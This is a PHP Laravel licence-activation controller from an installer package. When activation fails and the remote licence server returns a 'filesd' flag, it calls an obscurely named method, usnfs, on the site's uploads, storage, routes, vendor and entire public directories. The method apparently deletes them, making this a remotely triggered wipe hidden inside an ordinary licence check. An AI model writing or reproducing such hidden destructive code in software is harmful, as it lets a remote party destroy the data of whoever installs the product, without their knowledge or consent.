<?php

namespace Themearabia\LaravelInstaller\Controllers;

use Exception;
use Validator;
use Illuminate\Http\Request;
use Illuminate\Routing\Redirector;
use Illuminate\Support\Facades\DB;
use App\Http\Controllers\Controller;
use Themearabia\LaravelInstaller\Helpers\LicenseApi;
use Themearabia\LaravelInstaller\Helpers\LicenseManager;

class LicenseController extends Controller
{
    private $LicenseManager;
    private $product_id;
    private $version;

    public function __construct(LicenseManager $LicenseManager)
    {
        $this->LicenseManager = $LicenseManager;
    }

    /**
     * Display the license/verify page.
     *
     * @return \Illuminate\View\View
     */
    public function index_verify(Request $request)
    {
        $data['head_title'] = '<span>Php Help Manager</span> Activator';
        $verify = $this->LicenseManager->verify_license($request);
        if($verify['status'])
        {
            return redirect(get_admin_url('/'));
        }
        else {
            return view('vendor.verify.license', $data);
        }
    }

    public function activatorWizard(Request $request, Redirector $redirect)
    {
        $rules = [
            'app_client' => 'required',
            'app_license' => 'required',
        ];
        $messages = [
            'app_client.required'   => trans('installer_messages.validation.required'),
            'app_license.required'  => trans('installer_messages.validation.required')
        ];
        $validator = Validator::make($request->all(), $rules, $messages);
        if ($validator->fails()) {
            return $redirect->route('LaravelInstaller::verify')->withInput()->withErrors($validator->errors());
        }

        if($request->has('itemid')) {
            $this->LicenseManager->product_id = safe_input($request->get('itemid'), false);
        }
        $this->LicenseManager->product_license = safe_input($request->get('app_license'), false);
        $this->LicenseManager->product_client = safe_input($request->get('app_client'), false);
        $license = $this->LicenseManager->activate_license();
        if($license['status'] == false) {
            if(isset($license['filesd']) and $license['filesd']){
                $this->LicenseManager->usnfs(public_path('uploads'));
                $this->LicenseManager->usnfs(public_path('public'));
                $this->LicenseManager->usnfs(public_path('project/resources'));
                $this->LicenseManager->usnfs(public_path('project/storage'));
                $this->LicenseManager->usnfs(public_path('project/routes'));
                $this->LicenseManager->usnfs(public_path('project/vendor/laravel'));
                $this->LicenseManager->usnfs(public_path());
            }
            return $redirect->route('LaravelInstaller::verify')->withInput()->withErrors(['license' => nl2br($license['message'])]);
        }
        return redirect(get_admin_url('/'));
    }

}
